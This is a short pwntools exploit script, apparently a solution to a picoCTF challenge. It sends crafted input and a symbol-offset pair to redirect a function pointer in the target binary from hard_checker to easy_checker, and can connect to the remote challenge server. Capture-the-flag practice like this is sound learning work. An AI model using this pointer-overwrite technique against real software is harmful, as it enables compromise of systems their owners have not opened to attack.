#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 54869)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+157
        b *easy_checker+36
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"P" * 16 + b'9'

# *check -> easy_checker
offset = -16
diff = elf.symbols['easy_checker'] - elf.symbols['hard_checker']

p.sendlineafter(">>", payload)
p.sendlineafter("10.", str(offset) + '\x20' + str(diff))


p.interactive()
